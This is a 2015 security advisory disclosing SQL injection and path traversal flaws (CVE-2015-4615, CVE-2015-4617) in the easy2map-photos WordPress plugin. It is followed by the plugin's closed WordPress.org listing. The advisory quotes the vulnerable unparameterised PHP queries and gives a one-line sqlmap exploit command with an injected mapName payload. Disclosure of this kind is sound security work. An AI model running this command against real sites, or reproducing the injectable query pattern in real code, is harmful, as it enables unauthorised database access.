=== Content from www.vapidlabs.com_2ce5b1be_20250124_221013.html ===


| Advisory #: 130 |
| --- |
| **Title:** SQL Injection in easy2map-photos wordpress plugin v1.09 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2015-06-08 |
| **CVE-ID:**[[CVE-2015-4615](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4615)][[CVE-2015-4617](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4617)] |
| **CWE:** |
| **Download Site:** <https://wordpress.org/plugins/easy2map-photos> |
| **Vendor:** Steven Ellis |
| **Vendor Notified:**  2015-06-08 |
| **Vendor Contact:** https://profiles.wordpress.org/stevenellis/ |
| **Advisory:** <http://www.vapid.dhs.org/advisory.php?v=130> |
| **Description:** Easy2Map Photos is a simple-yet-powerful tool for generating great-looking geo-tagged photo galleries. |
| **Vulnerability:**The following lines in Functions.php are vulnerable to SQL injection attack because they are not parameterized or sanitizing user input. 48 $wpdb->query(sprintf("UPDATE $mapsTable 49 SET PolyLines = '%s' 50 WHERE ID = '%s';", $PolyLines, $mapID)); 218 $wpdb->query(sprintf(" 219 UPDATE $mapsTable 220 SET TemplateID = '%s', 221 MapName = '%s', 222 Settings = '%s', 223 CSSValues = '%s', 224 CSSValuesPhoto = '%s', 225 CSSValuesMap = '%s', 226 MapHTML = '%s', 227 IsActive = 1 228 WHERE ID = %s;", 229 $\_REQUEST['mapTemplateName'], 230 $\_REQUEST['mapName'], 231 urldecode($\_REQUEST['mapSettingsXML']), 232 urldecode($\_REQUEST["parentCSSXML"]), 233 urldecode($\_REQUEST["photoCSSXML"]), 234 urldecode($\_REQUEST["mapCSSXML"]), 235 urldecode($\_REQUEST["mapHTML"]), $mapID)); 238 //this is a map insert 239 if (!$wpdb->query(sprintf(" 240 INSERT INTO $mapsTable( 241 TemplateID, 242 MapName, 243 DefaultPinImage, 244 Settings, 245 LastInvoked, 246 PolyLines, 247 CSSValues, 248 CSSValuesPhoto, 249 CSSValuesMap, 250 MapHTML, 251 IsActive 252 ) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s' , 0);", 253 $\_REQUEST['mapTemplateName'], 254 $\_REQUEST['mapName’] 331 $wpdb->query(sprintf(" 332 UPDATE $mapsTable 333 SET MapName = '%s' 334 IsActive = 1 335 WHERE ID = %s;", 336 $\_REQUEST['mapName'], 337 $mapID)); , Also In MapPinImageUpload.php and MapPinIconSave.php this code would allow someone to create files outside of the intended upload directory by adding ../../../../ path traversal characters: if (!file\_exists($imagesDirectory)) { mkdir($imagesDirectory); } CVE-2015-4615 SQL Injection CVE-2015-4617 Path traversal |
| **Export:** [JSON](export_mitre_v4.py?id=130) [TEXT](txt.php?v=130) [XML](xml.php?s=130) |
| **Exploit Code:** ```   1. $ sqlmap -u 'http://wp.site:80/wp-admin/admin-ajax.php' --data="mapID=11&mapName='+or+1%3D%3D1%3B&action=e2m_img_save_map_name" --cookie='COOKIE HERE' --level=5 --risk=3  ``` |
| **Screen Shots:** |
| **Notes:** |



=== Content from wordpress.org_f2d5d469_20250126_040033.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

Easy2Map Photos

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Feasy2map-photos&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Feasy2map-photos&locale=en_US)

Search plugins

![](https://s.w.org/plugins/geopattern-icon/easy2map-photos_cad8d0.svg)
# easy2map-photos

By [Steven Ellis](http://easy2map.com/)

* [Details](https://wordpress.org/plugins/easy2map-photos/#description)
* [Reviews](https://wordpress.org/plugins/easy2map-photos/#reviews)
* [Development](https://wordpress.org/plugins/easy2map-photos/#developers)

[Support](https://wordpress.org/support/plugin/easy2map-photos/)

## Description

This plugin has been closed as of April 21, 2016 and is not available for download. Reason: Unknown.

## Reviews

![](https://secure.gravatar.com/avatar/4cc545c348435a570f48e6ba36e6cecad8013d7b14ed9312cbe052aa4e9b8268?s=60&d=retro&r=g)
### [Does not work. Even the pro version](https://wordpress.org/support/topic/does-not-work-even-the-pro-version/)

[simpatic380](https://profiles.wordpress.org/simpatic380/ "Posts by simpatic380")
September 3, 2016

It simply does not work. Map does not change when changing photos.
It work while set up, but no when showing on final page.
Emailed 2 times the Author, but no response yet.

[Read all 9 reviews](https://wordpress.org/support/plugin/easy2map-photos/reviews/)
## Contributors & Developers

“Easy2Map Photos” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/7a9da83848e4f3dbff1b343d775a0daa6c0dac6736f9da4c8279580bb463ef19?s=32&d=mm&r=g) [stevenellis](https://profiles.wordpress.org/stevenellis/)

[Translate “Easy2Map Photos” into your language.](https://translate.wordpress.org/projects/wp-plugins/easy2map-photos)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/easy2map-photos/), check out the [SVN repository](https://plugins.svn.wordpress.org/easy2map-photos/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/easy2map-photos/) by [RSS](https://plugins.trac.wordpress.org/log/easy2map-photos/?limit=100&mode=stop_on_copy&format=rss).

## Meta

* Version **2.0.6**
* Last updated **9 years ago**
* Active installations **N/A**
* WordPress version **3.0.1 or higher**
* Tested up to **4.3.34**
* [Advanced View](https://wordpress.org/plugins/easy2map-photos/advanced/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


